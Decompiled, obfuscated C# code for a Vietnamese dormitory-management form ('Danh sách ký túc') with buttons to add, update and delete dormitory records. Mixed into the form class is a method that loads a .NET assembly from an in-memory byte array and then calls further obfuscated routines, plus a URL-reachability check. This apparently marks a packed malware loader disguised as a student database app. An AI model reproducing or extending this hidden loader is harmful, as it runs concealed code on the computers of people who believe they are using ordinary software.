using System;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Lw3q;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Nz5w;
using f6HE;
using q9A4;
using w1R;

namespace y4G;

[DesignerGenerated]
public class Xs8 : Form
{
	private DataGridView _DataGridView1;

	private Label _Label2;

	private Label _Label1;

	private TextBox _TextBox2;

	private Button _Button5;

	private Button _Button6;

	internal IContainer l;

	internal TextBox m;

	internal Button K;

	public Xs8()
	{
		((Form)this).add_Load((EventHandler)c5S);
		Pf9();
	}

	protected override void i5C(bool r0F)
	{
		if (r0F && l != null)
		{
			l.Dispose();
		}
		((Form)this).Dispose(r0F);
	}

	private void Pf9()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Expected O, but got Unknown
		//IL_01c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d2: Expected O, but got Unknown
		//IL_022d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0237: Expected O, but got Unknown
		//IL_028f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0299: Expected O, but got Unknown
		//IL_0310: Unknown result type (might be due to invalid IL or missing references)
		//IL_031a: Expected O, but got Unknown
		//IL_0391: Unknown result type (might be due to invalid IL or missing references)
		//IL_039b: Expected O, but got Unknown
		p9Y(new DataGridView());
		a6W(new Label());
		j2R(new Label());
		Mp5(new TextBox());
		Nn5(new TextBox());
		Mg0(new Button());
		Kg7(new Button());
		Pk3(new Button());
		((ISupportInitialize)Gt1()).BeginInit();
		((Control)this).SuspendLayout();
		Gt1().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)Gt1()).set_Location(new Point(12, 187));
		((Control)Gt1()).set_Name("DataGridView1");
		((Control)Gt1()).set_Size(new Size(448, 309));
		((Control)Gt1()).set_TabIndex(0);
		a3P().set_AutoSize(true);
		((Control)a3P()).set_Font(new Font("Microsoft Sans Serif", 12.25f));
		((Control)a3P()).set_Location(new Point(22, 74));
		((Control)a3P()).set_Name("Label2");
		((Control)a3P()).set_Size(new Size(86, 20));
		((Control)a3P()).set_TabIndex(56);
		a3P().set_Text("Tên ký túc");
		n0E().set_AutoSize(true);
		((Control)n0E()).set_Font(new Font("Microsoft Sans Serif", 12.25f));
		((Control)n0E()).set_Location(new Point(22, 32));
		((Control)n0E()).set_Name("Label1");
		((Control)n0E()).set_Size(new Size(81, 20));
		((Control)n0E()).set_TabIndex(55);
		n0E().set_Text("Mã ký túc");
		((Control)Nq2()).set_Font(new Font("Microsoft Sans Serif", 12.25f));
		((Control)Nq2()).set_Location(new Point(147, 71));
		((Control)Nq2()).set_Name("TextBox2");
		((Control)Nq2()).set_Size(new Size(237, 26));
		((Control)Nq2()).set_TabIndex(54);
		((Control)k0C()).set_Font(new Font("Microsoft Sans Serif", 12.25f));
		((Control)k0C()).set_Location(new Point(147, 29));
		((Control)k0C()).set_Name("TextBox1");
		((Control)k0C()).set_Size(new Size(101, 26));
		((Control)k0C()).set_TabIndex(53);
		((Control)y9G()).set_Font(new Font("Microsoft Sans Serif", 12.25f));
		((Control)y9G()).set_Location(new Point(333, 131));
		((Control)y9G()).set_Name("Button1");
		((Control)y9G()).set_Size(new Size(127, 33));
		((Control)y9G()).set_TabIndex(60);
		((ButtonBase)y9G()).set_Text("Thoát");
		((ButtonBase)y9G()).set_UseVisualStyleBackColor(true);
		((Control)t1J()).set_Font(new Font("Microsoft Sans Serif", 12.25f));
		((Control)t1J()).set_Location(new Point(171, 131));
		((Control)t1J()).set_Name("Button5");
		((Control)t1J()).set_Size(new Size(127, 33));
		((Control)t1J()).set_TabIndex(58);
		((ButtonBase)t1J()).set_Text("Xóa");
		((ButtonBase)t1J()).set_UseVisualStyleBackColor(true);
		((Control)Zy3()).set_Font(new Font("Microsoft Sans Serif", 12.25f));
		((Control)Zy3()).set_Location(new Point(12, 131));
		((Control)Zy3()).set_Name("Button6");
		((Control)Zy3()).set_Size(new Size(127, 33));
		((Control)Zy3()).set_TabIndex(57);
		((ButtonBase)Zy3()).set_Text("Cập nhật");
		((ButtonBase)Zy3()).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(472, 517));
		((Control)this).get_Controls().Add((Control)(object)y9G());
		((Control)this).get_Controls().Add((Control)(object)t1J());
		((Control)this).get_Controls().Add((Control)(object)Zy3());
		((Control)this).get_Controls().Add((Control)(object)a3P());
		((Control)this).get_Controls().Add((Control)(object)n0E());
		((Control)this).get_Controls().Add((Control)(object)Nq2());
		((Control)this).get_Controls().Add((Control)(object)k0C());
		((Control)this).get_Controls().Add((Control)(object)Gt1());
		((Control)this).set_Name("Form4");
		((Form)this).set_Text("Danh sách ký túc");
		((ISupportInitialize)Gt1()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual DataGridView Gt1()
	{
		return _DataGridView1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p9Y(DataGridView Zb6)
	{
		_DataGridView1 = Zb6;
	}

	[SpecialName]
	internal virtual Label a3P()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a6W(Label i2P)
	{
		_Label2 = i2P;
	}

	[SpecialName]
	internal virtual Label n0E()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j2R(Label Lp0)
	{
		_Label1 = Lp0;
	}

	[SpecialName]
	internal virtual TextBox Nq2()
	{
		return _TextBox2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Mp5(TextBox t2E)
	{
		_TextBox2 = t2E;
	}

	[SpecialName]
	internal virtual TextBox k0C()
	{
		return m;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Nn5(TextBox Yt3)
	{
		TextBox val = (m = Yt3);
	}

	[SpecialName]
	internal virtual Button y9G()
	{
		return K;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Mg0(Button z9M)
	{
		EventHandler eventHandler = x7J;
		Button k = K;
		if (k != null)
		{
			((Control)k).remove_Click(eventHandler);
		}
		Button val = (K = z9M);
		k = K;
		if (k != null)
		{
			((Control)k).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button t1J()
	{
		return _Button5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Kg7(Button Hy3)
	{
		EventHandler eventHandler = t5T;
		Button button = _Button5;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button5 = Hy3;
		button = _Button5;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Zy3()
	{
		return _Button6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pk3(Button n1W)
	{
		EventHandler eventHandler = Kw9;
		Button button = _Button6;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button6 = n1W;
		button = _Button6;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	private void c5S(object sender, EventArgs e)
	{
		j5Q4.q6GS();
		Gt1().set_DataSource((object)Kj81.ds.Tables["kytuc"]);
	}

	private void Kw9(object sender, EventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		if (j5Q4.g7H3(k0C().get_Text()) == 0)
		{
			long num = (long)Interaction.MsgBox((object)"Bạn muốn thêm mới", (MsgBoxStyle)1, (object)"Thông Báo");
			if (num == 1L)
			{
				j5Q4.i9WB(k0C().get_Text(), Nq2().get_Text());
			}
			else
			{
				num = 2L;
			}
		}
		else
		{
			long num = (long)Interaction.MsgBox((object)"Mã khoa đã tồn tại,bạn có muốn sửa ?", (MsgBoxStyle)1, (object)"Thông Báo ");
			if (num == 1L)
			{
				j5Q4.e7G4(k0C().get_Text(), Nq2().get_Text());
			}
			else
			{
				num = 2L;
			}
		}
	}

	internal static bool e4J(string j9W)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(j9W);
			webRequest.GetResponse();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	private void t5T(object sender, EventArgs e)
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		if (j5Q4.g7H3(k0C().get_Text()) == 0)
		{
			Interaction.MsgBox((object)"Không có mã khoa này , không xóa được", (MsgBoxStyle)64, (object)"Thông báo");
		}
		else
		{
			j5Q4.Kp06(k0C().get_Text());
		}
	}

	internal static void Ws5()
	{
		object obj = Thread.GetDomain().Load((byte[])n5L.mDic[n5L.mArray]);
		n5L.mDic.Add("Ass2", RuntimeHelpers.GetObjectValue(obj));
		obj = null;
		if (Ry40.q6A7())
		{
			Xg76.Rz2g();
		}
	}

	private void x7J(object sender, EventArgs e)
	{
		((Control)this).Hide();
	}
}
